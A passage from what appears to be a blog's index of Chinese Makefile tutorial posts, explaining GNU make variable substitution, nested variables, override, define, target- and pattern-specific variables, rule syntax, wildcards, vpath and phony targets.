，其意思是，把变量“var”中所有以“a”字串“结尾”的“a”替换成“b”字串。这里的“结尾”意思是“空格”或是“结束符”。</p><p>还是看一个示例吧：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">foo := a.o b.o c.o</span><br><span class="line">bar := $(foo:.o=.c)</span><br></pre></td></tr></table></figure><p>这个示例中，我们先定义了一个 <code>(foo)</code> 变量，而第二行的意思是把 <code>(foo)</code> 中所有以 <code>.o</code> 字串“结尾”全部替换成 <code>.c</code> ，所以我们的 <code>(bar)</code> 的值就是a.c b.c c.c。</p><p>另外一种变量替换的技术是以“静态模式”（参见前面章节）定义的，如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">foo := a.o b.o c.o</span><br><span class="line">bar := $(foo:%.o=%.c)</span><br></pre></td></tr></table></figure><p>这依赖于被替换字串中的有相同的模式，模式中必须包含一个 <code>%</code> 字符，这个例子同样让 <code>(bar)</code> 变量的值为“a.c b.c c.c”。</p><p>第二种高级用法是——“把变量的值再当成变量”。先看一个例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">x = y</span><br><span class="line">y = z</span><br><span class="line">a := $($(x))</span><br></pre></td></tr></table></figure><p>在这个例子中，(x)的值是y，所以<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo></mrow><annotation encoding="application/x-tex">(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span></span></span></span>(x))就是(y)，于是(a)的值就是“z”。（注意，是“x=y”，而不是“x=(y)”）</p><p>我们还可以使用更多的层次：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">x = y</span><br><span class="line">y = z</span><br><span class="line">z = u</span><br><span class="line">a := $($($(x)))</span><br></pre></td></tr></table></figure><p>这里的 <code>(a)</code> 的值是“u”，相关的推导留给读者自己去做吧。</p><p>让我们再复杂一点，使用上“在变量定义中使用变量”的第一个方式，来看一个例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">x = $(y)</span><br><span class="line">y = z</span><br><span class="line">z = Hello</span><br><span class="line">a := $($(x))</span><br></pre></td></tr></table></figure><p>这里的 <code>((x))</code> 被替换成了 <code>((y))</code> ，因为 <code>(y)</code> 值是“z”，所以，最终结果是： <code>a:=(z)</code> ，也就是“Hello”。</p><p>再复杂一点，我们再加上函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">x = variable1</span><br><span class="line">variable2 := Hello</span><br><span class="line">y = $(subst 1,2,$(x))</span><br><span class="line">z = y</span><br><span class="line">a := $($($(z)))</span><br></pre></td></tr></table></figure><p>这个例子中，  <code>(x)</code> 的值是“variable1”，subst函数把“variable1”中的所有“1”字串替换成“2”字串，于是，“variable1”变成 “variable2”，再取其值，所以，最终， <code>(a)</code> 的值就是 <code>(variable2)</code> 的值——“Hello”。（喔，好不容易）</p><p>在这种方式中，或要可以使用多个变量来组成一个变量的名字，然后再取其值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">first_second = Hello</span><br><span class="line">a = first</span><br><span class="line">b = second</span><br><span class="line">all = $($a_$b)</span><br></pre></td></tr></table></figure><p>这里的 <code>a_b</code> 组成了“first_second”，于是， <code>(all)</code> 的值就是“Hello”。</p><p>再来看看结合第一种技术的例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a_objects := a.o b.o c.o</span><br><span class="line">1_objects := 1.o 2.o 3.o</span><br><span class="line"></span><br><span class="line">sources := $($(a1)_objects:.o=.c)</span><br></pre></td></tr></table></figure><p>这个例子中，如果 <code>(a1)</code> 的值是“a”的话，那么， <code>(sources)</code> 的值就是“a.c b.c c.c”；如果 <code>(a1)</code> 的值是“1”，那么 <code>(sources)</code> 的值是“1.c 2.c 3.c”。</p><p>再来看一个这种技术和“函数”与“条件语句”一同使用的例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ifdef do_sort</span><br><span class="line">    func := sort</span><br><span class="line">else</span><br><span class="line">    func := strip</span><br><span class="line">endif</span><br><span class="line"></span><br><span class="line">bar := a d b g q c</span><br><span class="line"></span><br><span class="line">foo := $($(func) $(bar))</span><br></pre></td></tr></table></figure><p>这个示例中，如果定义了“do_sort”，那么： <code>foo := (sort a d b g q c)</code> ，于是 <code>(foo)</code> 的值就是 “a b c d g q”，而如果没有定义“do_sort”，那么： <code>foo := (strip a d b g q c)</code> ，调用的就是strip函数。</p><p>当然，“把变量的值再当成变量”这种技术，同样可以用在操作符的左边:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">dir = foo</span><br><span class="line">$(dir)_sources := $(wildcard $(dir)/*.c)</span><br><span class="line">define $(dir)_print</span><br><span class="line">lpr $($(dir)_sources)</span><br><span class="line">endef</span><br></pre></td></tr></table></figure><p>这个例子中定义了三个变量：“dir”，“foo_sources”和“foo_print”。</p><h2 id="追加变量值">追加变量值<a href="https://seisman.github.io/how-to-write-makefile/variables.html#id5">¶</a></h2><p>我们可以使用 <code>+=</code> 操作符给变量追加值，如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">objects = main.o foo.o bar.o utils.o</span><br><span class="line">objects += another.o</span><br></pre></td></tr></table></figure><p>于是，我们的 <code>(objects)</code> 值变成：“main.o foo.o bar.o utils.o another.o”（another.o被追加进去了）</p><p>使用 <code>+=</code> 操作符，可以模拟为下面的这种例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">objects = main.o foo.o bar.o utils.o</span><br><span class="line">objects := $(objects) another.o</span><br></pre></td></tr></table></figure><p>所不同的是，用 <code>+=</code> 更为简洁。</p><p>如果变量之前没有定义过，那么， <code>+=</code> 会自动变成 <code>=</code> ，如果前面有变量定义，那么 <code>+=</code> 会继承于前次操作的赋值符。如果前一次的是 <code>:=</code> ，那么 <code>+=</code> 会以 <code>:=</code> 作为其赋值符，如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">variable := value</span><br><span class="line">variable += more</span><br></pre></td></tr></table></figure><p>等价于：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">variable := value</span><br><span class="line">variable := $(variable) more</span><br></pre></td></tr></table></figure><p>但如果是这种情况：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">variable = value</span><br><span class="line">variable += more</span><br></pre></td></tr></table></figure><p>由于前次的赋值符是 <code>=</code> ，所以 <code>+=</code> 也会以 <code>=</code> 来做为赋值，那么岂不会发生变量的递补归定义，这是很不好的，所以make会自动为我们解决这个问题，我们不必担心这个问题。</p><h2 id="override-指示符">override 指示符<a href="https://seisman.github.io/how-to-write-makefile/variables.html#override">¶</a></h2><p>如果有变量是通常make的命令行参数设置的，那么Makefile中对这个变量的赋值会被忽略。如果你想在Makefile中设置这类参数的值，那么，你可以使用“override”指示符。其语法是:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">override &lt;variable&gt;; = &lt;value&gt;;</span><br><span class="line"></span><br><span class="line">override &lt;variable&gt;; := &lt;value&gt;;</span><br></pre></td></tr></table></figure><p>当然，你还可以追加:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">override &lt;variable&gt;; += &lt;more text&gt;;</span><br></pre></td></tr></table></figure><p>对于多行的变量定义，我们用define指示符，在define指示符前，也同样可以使用override指示符，如:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">override define foo</span><br><span class="line">bar</span><br><span class="line">endef</span><br></pre></td></tr></table></figure><h2 id="多行变量">多行变量<a href="https://seisman.github.io/how-to-write-makefile/variables.html#id6">¶</a></h2><p>还有一种设置变量值的方法是使用define关键字。使用define关键字设置变量的值可以有换行，这有利于定义一系列的命令（前面我们讲过“命令包”的技术就是利用这个关键字）。</p><p>define指示符后面跟的是变量的名字，而重起一行定义变量的值，定义是以endef 关键字结束。其工作方式和“=”操作符一样。变量的值可以包含函数、命令、文字，或是其它变量。因为命令需要以[Tab]键开头，所以如果你用define定义的命令变量中没有以 <code>Tab</code> 键开头，那么make 就不会把其认为是命令。</p><p>下面的这个示例展示了define的用法:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">define two-lines</span><br><span class="line">echo foo</span><br><span class="line">echo $(bar)</span><br><span class="line">endef</span><br></pre></td></tr></table></figure><h2 id="环境变量">环境变量<a href="https://seisman.github.io/how-to-write-makefile/variables.html#id7">¶</a></h2><p>make运行时的系统环境变量可以在make开始运行时被载入到Makefile文件中，但是如果Makefile中已定义了这个变量，或是这个变量由make命令行带入，那么系统的环境变量的值将被覆盖。（如果make指定了“-e”参数，那么，系统环境变量将覆盖Makefile中定义的变量）</p><p>因此，如果我们在环境变量中设置了 <code>CFLAGS</code> 环境变量，那么我们就可以在所有的Makefile中使用这个变量了。这对于我们使用统一的编译参数有比较大的好处。如果Makefile中定义了CFLAGS，那么则会使用Makefile中的这个变量，如果没有定义则使用系统环境变量的值，一个共性和个性的统一，很像“全局变量”和“局部变量”的特性。</p><p>当make嵌套调用时（参见前面的“嵌套调用”章节），上层Makefile中定义的变量会以系统环境变量的方式传递到下层的Makefile 中。当然，默认情况下，只有通过命令行设置的变量会被传递。而定义在文件中的变量，如果要向下层Makefile传递，则需要使用export关键字来声明。（参见前面章节）</p><p>当然，我并不推荐把许多的变量都定义在系统环境中，这样，在我们执行不用的Makefile时，拥有的是同一套系统变量，这可能会带来更多的麻烦。</p><h2 id="目标变量">目标变量<a href="https://seisman.github.io/how-to-write-makefile/variables.html#id8">¶</a></h2><p>前面我们所讲的在Makefile中定义的变量都是“全局变量”，在整个文件，我们都可以访问这些变量。当然，“自动化变量”除外，如 <code>&lt;</code> 等这种类量的自动化变量就属于“规则型变量”，这种变量的值依赖于规则的目标和依赖目标的定义。</p><p>当然，我也同样可以为某个目标设置局部变量，这种变量被称为“Target-specific Variable”，它可以和“全局变量”同名，因为它的作用范围只在这条规则以及连带规则中，所以其值也只在作用范围内有效。而不会影响规则链以外的全局变量的值。</p><p>其语法是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;target ...&gt; : &lt;variable-assignment&gt;;</span><br><span class="line"></span><br><span class="line">&lt;target ...&gt; : overide &lt;variable-assignment&gt;</span><br></pre></td></tr></table></figure><p><variable-assignment>;可以是前面讲过的各种赋值表达式，如 <code>=</code> 、 <code>:=</code> 、 <code>+=</code> 或是 <code>?=</code> 。第二个语法是针对于make命令行带入的变量，或是系统环境变量。</p><p>这个特性非常的有用，当我们设置了这样一个变量，这个变量会作用到由这个目标所引发的所有的规则中去。如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">prog : CFLAGS = -g</span><br><span class="line">prog : prog.o foo.o bar.o</span><br><span class="line">    $(CC) $(CFLAGS) prog.o foo.o bar.o</span><br><span class="line"></span><br><span class="line">prog.o : prog.c</span><br><span class="line">    $(CC) $(CFLAGS) prog.c</span><br><span class="line"></span><br><span class="line">foo.o : foo.c</span><br><span class="line">    $(CC) $(CFLAGS) foo.c</span><br><span class="line"></span><br><span class="line">bar.o : bar.c</span><br><span class="line">    $(CC) $(CFLAGS) bar.c</span><br></pre></td></tr></table></figure><p>在这个示例中，不管全局的 <code>(CFLAGS)</code> 的值是什么，在prog目标，以及其所引发的所有规则中（prog.o foo.o bar.o的规则）， <code>(CFLAGS)</code> 的值都是 <code>-g</code></p><h2 id="模式变量">模式变量<a href="https://seisman.github.io/how-to-write-makefile/variables.html#id9">¶</a></h2><p>在GNU的make中，还支持模式变量（Pattern-specific Variable），通过上面的目标变量中，我们知道，变量可以定义在某个目标上。模式变量的好处就是，我们可以给定一种“模式”，可以把变量定义在符合这种模式的所有目标上。</p><p>我们知道，make的“模式”一般是至少含有一个 <code>%</code> 的，所以，我们可以以如下方式给所有以 <code>.o</code> 结尾的目标定义目标变量：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%.o : CFLAGS = -O</span><br></pre></td></tr></table></figure><p>同样，模式变量的语法和“目标变量”一样：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;pattern ...&gt;; : &lt;variable-assignment&gt;;</span><br><span class="line"></span><br><span class="line">&lt;pattern ...&gt;; : override &lt;variable-assignment&gt;;</span><br></pre></td></tr></table></figure><p>override同样是针对于系统环境传入的变量，或是make命令行指定的变量。</p>]]></content>
      
      
      <categories>
          
          <category> 二进制分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Makefile </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Makefile书写规则</title>
      <link href="/2024/04/26/Security/binary/Makefile/2.%E4%B9%A6%E5%86%99%E8%A7%84%E5%88%99/"/>
      <url>/2024/04/26/Security/binary/Makefile/2.%E4%B9%A6%E5%86%99%E8%A7%84%E5%88%99/</url>
      
        <content type="html"><![CDATA[<h1 id="书写规则">书写规则<a href="https://seisman.github.io/how-to-write-makefile/rules.html#id1">¶</a></h1><p>规则包含两个部分，一个是依赖关系，一个是生成目标的方法。</p><p>在Makefile中，规则的顺序是很重要的，因为，Makefile中只应该有一个最终目标，其它的目标都是被这个目标所连带出来的，所以一定要让make知道你的最终目标是什么。一般来说，定义在Makefile中的目标可能会有很多，但是第一条规则中的目标将被确立为最终的目标。如果第一条规则中的目标有很多个，那么，第一个目标会成为最终的目标。make所完成的也就是这个目标。</p><p>好了，还是让我们来看一看如何书写规则。</p><h2 id="规则举例">规则举例<a href="https://seisman.github.io/how-to-write-makefile/rules.html#id2">¶</a></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">foo.o: foo.c defs.h       # foo模块</span><br><span class="line">    cc -c -g foo.c</span><br></pre></td></tr></table></figure><p>看到这个例子，各位应该不是很陌生了，前面也已说过， <code>foo.o</code> 是我们的目标， <code>foo.c</code> 和 <code>defs.h</code> 是目标所依赖的源文件，而只有一个命令 <code>cc -c -g foo.c</code> （以Tab键开头）。这个规则告诉我们两件事：</p><ol><li>文件的依赖关系， <code>foo.o</code> 依赖于 <code>foo.c</code> 和 <code>defs.h</code> 的文件，如果 <code>foo.c</code> 和 <code>defs.h</code> 的文件日期要比 <code>foo.o</code> 文件日期要新，或是 <code>foo.o</code> 不存在，那么依赖关系发生。</li><li>生成或更新 <code>foo.o</code> 文件，就是那个cc命令。它说明了如何生成 <code>foo.o</code> 这个文件。（当然，foo.c文件include了defs.h文件）</li></ol><h2 id="规则的语法">规则的语法<a href="https://seisman.github.io/how-to-write-makefile/rules.html#id3">¶</a></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">targets : prerequisites</span><br><span class="line">    command</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p>或是这样：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">targets : prerequisites ; command</span><br><span class="line">    command</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p>targets是文件名，以空格分开，可以使用通配符。一般来说，我们的目标基本上是一个文件，但也有可能是多个文件。</p><p>command是命令行，如果其不与“target:prerequisites”在一行，那么，必须以 <code>Tab</code> 键开头，如果和prerequisites在一行，那么可以用分号做为分隔。（见上）</p><p>prerequisites也就是目标所依赖的文件（或依赖目标）。如果其中的某个文件要比目标文件要新，那么，目标就被认为是“过时的”，被认为是需要重生成的。这个在前面已经讲过了。</p><p>如果命令太长，你可以使用反斜杠 <code>\</code> 作为换行符。make对一行上有多少个字符没有限制。规则告诉make两件事，文件的依赖关系和如何生成目标文件。</p><p>一般来说，make会以UNIX的标准Shell，也就是 <code>/bin/sh</code> 来执行命令。</p><h2 id="在规则中使用通配符">在规则中使用通配符<a href="https://seisman.github.io/how-to-write-makefile/rules.html#id4">¶</a></h2><p>如果我们想定义一系列比较类似的文件，我们很自然地就想起使用通配符。make支持三个通配符： <code>*</code> ， <code>?</code> 和 <code>~</code> 。这是和Unix的B-Shell是相同的。</p><p>波浪号 <code>~</code> 字符在文件名中也有比较特殊的用途。如果是 <code>~/test</code> ，这就表示当前用户的 <code>$HOME</code> 目录下的test目录。而 <code>~hchen/test</code> 则表示用户hchen的宿主目录下的test 目录。（这些都是Unix下的小知识了，make也支持）而在Windows或是 MS-DOS下，用户没有宿主目录，那么波浪号所指的目录则根据环境变量“HOME”而定。</p><p>通配符代替了你一系列的文件，如 <code>*.c</code> 表示所有后缀为c的文件。一个需要我们注意的是，如果我们的文件名中有通配符，如： <code>*</code> ，那么可以用转义字符 <code>\</code> ，如 <code>\*</code> 来表示真实的 <code>*</code> 字符，而不是任意长度的字符串。</p><p>好吧，还是先来看几个例子吧：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">clean:</span><br><span class="line">    rm -f *.o</span><br></pre></td></tr></table></figure><p>其实在这个clean:后面可以加上你想做的一些事情，如果你想看到在编译完后看看main.c的源代码，你可以在加上cat这个命令，例子如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">clean:</span><br><span class="line">    cat main.c</span><br><span class="line">    rm -f *.o</span><br></pre></td></tr></table></figure><p>其结果你试一下就知道的。 上面这个例子我不不多说了，这是操作系统Shell所支持的通配符。这是在命令中的通配符。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">print: *.c</span><br><span class="line">    lpr -p $?</span><br><span class="line">    touch print</span><br></pre></td></tr></table></figure><p>上面这个例子说明了通配符也可以在我们的规则中，目标print依赖于所有的 <code>.c</code> 文件。其中的 <code>$?</code> 是一个自动化变量，我会在后面给你讲述。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objects = *.o</span><br></pre></td></tr></table></figure><p>上面这个例子，表示了通配符同样可以用在变量中。并不是说 <code>*.o</code> 会展开，不！objects的值就是 <code>*.o</code> 。Makefile中的变量其实就是C/C++中的宏。如果你要让通配符在变量中展开，也就是让objects的值是所有 <code>.o</code> 的文件名的集合，那么，你可以这样：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objects := $(wildcard *.o)</span><br></pre></td></tr></table></figure><p>另给一个变量使用通配符的例子：</p><ol><li><p>列出一确定文件夹中的所有 <code>.c</code> 文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objects := $(wildcard *.c)</span><br></pre></td></tr></table></figure></li><li><p>列出(1)中所有文件对应的 <code>.o</code> 文件，在（3）中我们可以看到它是由make自动编译出的:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(patsubst %.c,%.o,$(wildcard *.c))</span><br></pre></td></tr></table></figure></li><li><p>由(1)(2)两步，可写出编译并链接所有 <code>.c</code> 和 <code>.o</code> 文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">objects := $(patsubst %.c,%.o,$(wildcard *.c))</span><br><span class="line">foo : $(objects)</span><br><span class="line">    cc -o foo $(objects)</span><br></pre></td></tr></table></figure></li></ol><p>这种用法由关键字“wildcard”，“patsubst”指出，关于Makefile的关键字，我们将在后面讨论。</p><h2 id="文件搜寻">文件搜寻<a href="https://seisman.github.io/how-to-write-makefile/rules.html#id5">¶</a></h2><p>在一些大的工程中，有大量的源文件，我们通常的做法<mark>是把这许多的源文件分类</mark>，并存放在不同的目录中。所以，当make需要去找寻文件的依赖关系时，<u>你可以在文件前加上路径，但最好的方法是把一个路径告诉make，让make在自动去找。</u></p><p>Makefile文件中的特殊变量 <code>VPATH</code> 就是完成这个功能的，如果没有指明这个变量，make只会在当前的目录中去找寻依赖文件和目标文件。如果定义了这个变量，那么，make就会在当前目录找不到的情况下，到所指定的目录中去找寻文件了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">VPATH = src:../headers</span><br></pre></td></tr></table></figure><p>上面的定义指定两个目录，“src”和“…/headers”，make会按照这个顺序进行搜索。目录由“冒号”分隔。（当然，当前目录永远是最高优先搜索的地方）</p><p>另一个设置文件搜索路径的方法是使用make的“vpath”关键字（注意，它是全小写的），这不是变量，这是一个make的关键字，这和上面提到的那个VPATH变量很类似，但是它更为灵活。它可以指定不同的文件在不同的搜索目录中。这是一个很灵活的功能。它的使用方法有三种：</p><ul><li><p><code>vpath &lt;pattern&gt; &lt;directories&gt;</code></p><p>为符合模式<pattern>的文件指定搜索目录<directories>。</p></li><li><p><code>vpath &lt;pattern&gt;</code></p><p>清除符合模式<pattern>的文件的搜索目录。</p></li><li><p><code>vpath</code></p><p>清除所有已被设置好了的文件搜索目录。</p></li></ul><p>vpath使用方法中的<pattern>需要包含 % 字符。 % 的意思是匹配零或若干字符，（需引用 % ，使用 <code>\</code> ）例如， <code>\%.h</code> 表示所有以 <code>.h</code> 结尾的文件。<pattern>指定了要搜索的文件集，而<directories>则指定了&lt; pattern&gt;的文件集的搜索的目录。例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vpath %.h ../headers</span><br></pre></td></tr></table></figure><p>该语句表示，要求make在“…/headers”目录下搜索所有以 <code>.h</code> 结尾的文件。（如果某文件在当前目录没有找到的话）</p><p>我们可以连续地使用vpath语句，以指定不同搜索策略。如果连续的vpath语句中出现了相同的<pattern> ，或是被重复了的<pattern>，那么，make会按照vpath语句的先后顺序来执行搜索。如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vpath %.c foo</span><br><span class="line">vpath %   blish</span><br><span class="line">vpath %.c bar</span><br></pre></td></tr></table></figure><p>其表示 <code>.c</code> 结尾的文件，先在“foo”目录，然后是“blish”，最后是“bar”目录。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vpath %.c foo:bar</span><br><span class="line">vpath %   blish</span><br></pre></td></tr></table></figure><p>而上面的语句则表示 <code>.c</code> 结尾的文件，先在“foo”目录，然后是“bar”目录，最后才是“blish”目录。</p><h2 id="伪目标">伪目标<a href="https://seisman.github.io/how-to-write-makefile/rules.html#id6">¶</a></h2><p>最早先的一个例子中，我们提到过一个“clean”的目标，这是一个“伪目标”，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">clean:</span><br><span class="line">    rm *.o temp</span><br></pre></td></tr></table></figure><p>正像我们前面例子中的“clean”一样，既然我们生成了许多文件编译文件，我们也应该提供一个清除它们的“目标”以备完整地重编译而用。 （以“make clean”来使用该目标）</p><p>因为，我们并不生成“clean”这个文件。“伪目标”并不是一个文件，只是一个标签，由于“伪目标”不是文件，所以make无法生成它的依赖关系和决定它是否要执行。我们只有通过显式地指明这个“目标”才能让其生效。当然，“伪目标”的取名不能和文件名重名，不然其就失去了“伪目标”的意义了。</p><p>当然，为了避免和文件重名的这种情况，我们可以使用一个特殊的标记“.PHONY”来显式地指明一个目标是“伪目标”，向make说明，不管是否有这个文件，这个目标就是“伪目标”。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.PHONY : clean</span><br></pre></td></tr></table></figure><p>只要有这个声明，不管是否有“clean”文件，要运行“clean”这个目标，只有“make clean”这样。于是整个过程可以这样写：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.PHONY : clean</span><br><span class="line">clean :</span><br><span class="line">    rm *.o temp</span><br></pre></td></tr></table></figure><p>伪目标一般没有依赖的文件。但是，我们也可以为伪目标指定所依赖的文件。伪目标同样可以作为“默认目标”，只要将其放在第一个。一个示例就是，如果你的Makefile需要一口气生成若干个可执行文件，但你只想简单地敲一个make完事，并且，所有的目标文件都写在一个Makefile中，那么你可以使用“伪目标”这个特性：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">all : prog1 prog2 prog3</span><br><span class="line">.PHONY : all</span><br><span class="line"></span><br><span class="line">prog1 : prog1.o utils.o</span><br><span class="line">    cc -o prog1 prog1.o utils.o</span><br><span class="line"></span><br><span class="line">prog2 : prog2.o</span><br><span class="line">    cc -o prog2 prog2.o</span><br><span class="line"></span><br><span class="line">prog3 : prog3.o sort.o utils.o</span><br><span class="line">    cc -o prog3 prog3.o sort.o utils.o</span><br></pre></td></tr></table></figure><p>我们知道，Makefile中的第一个目标会被作为其默认目标。我们声明了一个“all”的伪目标，其依赖于其它三个目标。由于默认目标的特性是，总是被执行的，但由于“all”又是一个伪目标，伪目标只是一个标签不会生成文件，所以不会有“all”文件产生。于是，其它三个目标的规则总是会被决议。也就达到了我们一口气生成多个目标的目的。 <code>.PHONY : all</code> 声明了“all”这个目标为“伪目标”。（注：这里的显式“.PHONY : all” 不写的话一般情况也可以正确的执行，这样make可通过隐式规则推导出， “all” 是一个伪目标，执行make不会生成“all”文件，而执行后面的多个目标。建议：显式写出是一个好习惯。）</p><p>随便提一句，从上面的例子我们可以看出，目标也可以成为依赖。所以，伪目标同样也可成为依赖。看下面的例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.PHONY : cleanall cleanobj cleandiff</span><br><span class="line"></span><br><span class="line">cleanall : cleanobj cleandiff</span><br><span class="line">    rm program</span><br><span class="line"></span><br><span class="line">cleanobj :</span><br><span class="line">    rm *.o</span><br><span class="line"></span><br><span class="line">cleandiff :</span><br><span class="line">    rm *.diff</span><br></pre></td></tr></table></figure><p>“make cleanall”将清除所有要被清除的文件。“cleanobj”和“cleandiff”这两个伪目标有点像“子程序”的意思。我们可以输入“make cleanall”和“make cleanobj”和“make cleandiff”命令来达到清除不同种类文件的目的。</p><h2 id="多目标">多目标<a 